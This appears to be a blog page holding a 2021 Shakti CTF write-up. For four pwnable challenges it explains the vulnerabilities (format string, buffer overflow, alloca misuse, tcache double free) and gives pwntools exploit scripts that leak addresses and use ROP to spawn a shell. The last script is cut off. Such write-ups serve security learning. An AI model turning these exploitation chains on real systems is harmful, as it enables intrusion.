@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pwnkidhn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="2021 Shakti CTF Write-up   Birdie (pwnable)vulnerability First, Check the protection. It is easy to find binary address because of NoPIE.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021 Shakti CTF">
+<meta property="og:url" content="https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/index.html">
+<meta property="og:site_name" content="rvkhunLab">
+<meta property="og:description" content="2021 Shakti CTF Write-up   Birdie (pwnable)vulnerability First, Check the protection. It is easy to find binary address because of NoPIE.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113524421-8bc82380-95e9-11eb-86b9-8077212d2a11.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113524509-17da4b00-95ea-11eb-8226-4d163a6971c1.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113524624-f7f75700-95ea-11eb-964c-5c42f3c189cd.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113530052-07cd6600-9600-11eb-8ddf-12609a94aa24.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113530229-74e0fb80-9600-11eb-8089-315a30970f31.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113530470-18321080-9601-11eb-934f-3985f714c59a.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113530906-38ae9a80-9602-11eb-8d67-11f5a5b44c67.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113530956-61cf2b00-9602-11eb-8bfd-f530d08b7bcf.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113531112-d99d5580-9602-11eb-8442-fb96d5583fc5.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113531409-ad360900-9603-11eb-9a03-8f976e9834cd.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113531606-29305100-9604-11eb-8fe7-896db2202e74.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113531642-3fd6a800-9604-11eb-83bb-2ee11ad99ae7.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113531673-541aa500-9604-11eb-8cec-2bffef0ea6d6.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/113531879-ed49bb80-9604-11eb-96e6-e007da518756.png">
+<meta property="article:published_time" content="2021-04-04T15:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-25T19:06:07.481Z">
+<meta property="article:author" content="rvkhun">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwnable">
+<meta property="article:tag" content="write-up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png">
+
+<link rel="canonical" href="https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2021 Shakti CTF | rvkhunLab</title>
+  <meta name="google-site-verification" content="eBj8hDfb8V5sujjVERa_zAbaTQFLbQzowFQfUz3Rhw8">
+  <meta name="naver-site-verification" content="7c18a15cd138e9448d263381fe6201215fc40046">
+
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/rss2.xml" title="rvkhunLab" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rvkhunLab</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Write about System Hacking</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/raccoon1.jpg">
+      <meta itemprop="name" content="rvkhun">
+      <meta itemprop="description" content="Security Researcher / CTF Player">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rvkhunLab">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021 Shakti CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-05 00:00:00" itemprop="dateCreated datePublished" datetime="2021-04-05T00:00:00+09:00">2021-04-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-26 04:06:07" itemprop="dateModified" datetime="2021-09-26T04:06:07+09:00">2021-09-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Write-up/" itemprop="url" rel="index"><span itemprop="name">Write-up</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <center>2021 Shakti CTF Write-up </center>
+
+<h1 id="Birdie-pwnable"><a href="#Birdie-pwnable" class="headerlink" title="Birdie (pwnable)"></a>Birdie (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png" alt="CTF1"></p>
+<p>First, Check the protection. It is easy to find binary address because of NoPIE.</p>
+<span id="more"></span>
+<p><img src="https://user-images.githubusercontent.com/49066484/113524421-8bc82380-95e9-11eb-86b9-8077212d2a11.png" alt="CTF2"></p>
+<p>When i analyzed it on IDA, i found that there are two vulnerabilities. The first one is <code>Format String Bug</code> on line 11. And the other is <code>Buffer Overflow</code> on line 13. </p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113524509-17da4b00-95ea-11eb-8226-4d163a6971c1.png" alt="CTF3"></p>
+<p>So i could leak canary and libc addr using <code>Format String Bug</code>. And i could get <code>oneshot</code> because i knew the  libc address. </p>
+<p>Let’s get the shell.</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 1111)</span></span><br><span class="line">p = process(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4007e2</span></span><br><span class="line">system = e.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x004008f3</span></span><br><span class="line">prsi = <span class="number">0x004008f1</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;name\n&#x27;</span>,<span class="string">&#x27;%15$p::%17$p::&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">libc = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">libcbase = libc - <span class="number">0x21bf7</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(oneshot)</span><br><span class="line">p.sendafter(<span class="string">&#x27;payload\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Signal-dROPper-pwnable"><a href="#Signal-dROPper-pwnable" class="headerlink" title="Signal dROPper (pwnable)"></a>Signal dROPper (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524624-f7f75700-95ea-11eb-964c-5c42f3c189cd.png" alt="CTF4"></p>
+<p>Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113530052-07cd6600-9600-11eb-8ddf-12609a94aa24.png" alt="CTF5"></p>
+<p><code>0x6020c0</code> includes heap address, <code>0x602120</code> includes size of heap. It seems like you can allocate up to 12 buffers but not really. </p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113530229-74e0fb80-9600-11eb-8089-315a30970f31.png" alt="CTF6"></p>
+<p>If i could overwrite read’s size (0x602120[v4]), the buffer overflow. </p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113530470-18321080-9601-11eb-934f-3985f714c59a.png" alt="CTF7"></p>
+<p>So i allocated 13 heaps, then i could overwrite the size part (0x602128). lastly i could write on buffer 0x17c16f0 bytes!</p>
+<p>It only remain to leak the libc addr and overwrite return address using ROP.</p>
+<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 2222)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x6020c0</span></span><br><span class="line">size = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x00400c03</span></span><br><span class="line">prsi = <span class="number">0x00400c01</span></span><br><span class="line">main = <span class="number">0x400b32</span></span><br><span class="line"></span><br><span class="line">put_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vuln</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;to: &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">    vuln()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(put_got)</span><br><span class="line">payload += p64(put_plt)</span><br><span class="line">payload += p64(<span class="number">0x4008e7</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase = leak - <span class="number">0x80aa0</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase  + <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Choice &gt; &#x27;,&#x27;3&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Returning-2-pwnable"><a href="#Returning-2-pwnable" class="headerlink" title="Returning-2 (pwnable)"></a>Returning-2 (pwnable)</h1><h2 id="vulnerability-2"><a href="#vulnerability-2" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113530906-38ae9a80-9602-11eb-8d67-11f5a5b44c67.png" alt="CTF8"></p>
+<p>Check Protection,  No canary~</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113530956-61cf2b00-9602-11eb-8bfd-f530d08b7bcf.png" alt="CTF9"></p>
+<p>It is Buffer overflow vulnerability. and also i could allocate dynamically on stack using <code>alloca</code> functions. </p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113531112-d99d5580-9602-11eb-8442-fb96d5583fc5.png" alt="CTF10"></p>
+<p>I could find that i can make buffer address to read  <code>rsp</code>, when  the alloca’s size is <code>-30</code>.<br>Lastly I use ROP to exploit.</p>
+<h2 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 3333)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601500</span></span><br><span class="line">push_rsp = e.symbols[<span class="string">&#x27;push_rsp&#x27;</span>]</span><br><span class="line">mov = <span class="number">0x0400774</span></span><br><span class="line">prax = <span class="number">0x040079a</span></span><br><span class="line">prdi = <span class="number">0x040077f</span></span><br><span class="line">prsi = <span class="number">0x0400791</span></span><br><span class="line">prdx = <span class="number">0x0400788</span></span><br><span class="line">syscall = <span class="number">0x04007a3</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>,<span class="built_in">str</span>(-<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(mov)</span><br><span class="line">payload += p64(prdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;text:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bye!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Cache-7-pwnable"><a href="#Cache-7-pwnable" class="headerlink" title="Cache_7 (pwnable)"></a>Cache_7 (pwnable)</h1><h2 id="vulnerability-3"><a href="#vulnerability-3" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113531409-ad360900-9603-11eb-9a03-8f976e9834cd.png" alt="CTF11"></p>
+<p>I can’t overwrite plt.got because it is FULL RELRO. I am gonna overwrite _hook address.</p>
+<p>Let’s analyze the binary.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113531606-29305100-9604-11eb-8fe7-896db2202e74.png" alt="123"></p>
+<p>Allocate heap memory  here.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113531642-3fd6a800-9604-11eb-83bb-2ee11ad99ae7.png" alt="456"></p>
+<p>Free the memory here.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113531673-541aa500-9604-11eb-8cec-2bffef0ea6d6.png" alt="789"></p>
+<p>And can leak the memory using this.</p>
+<p>You know, there is vulnerability about <code>Tcache double free</code> in Ubuntu 18.04 before patching.</p>
+<p>And also they gave me the Libc file. It is Libc-2.27, and they gave hint . “Old Ubuntu 18.04”.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/113531879-ed49bb80-9604-11eb-96e6-e007da518756.png" alt="1010"></p>
+<p>I tested about it . First I allocated 0x40 size heap. and free the memory three times. The picture above shows that double free is possible.<br>There is no protection about <code>double free</code> in Ubuntu 18.04, but it is patched now.  </p>
+<p>Then it is easy to exploit. I use this vulnerability i can leak the memory and also overwrite _hook address. </p>
+<h2 id="exploit-3"><a href="#exploit-3" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;,4444)</span></span><br><span class="line">p = process([<span class="string">&#x27;./chall&#x27;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x601050</span></span><br><span class="line">stdin = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data\n&#x27;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span 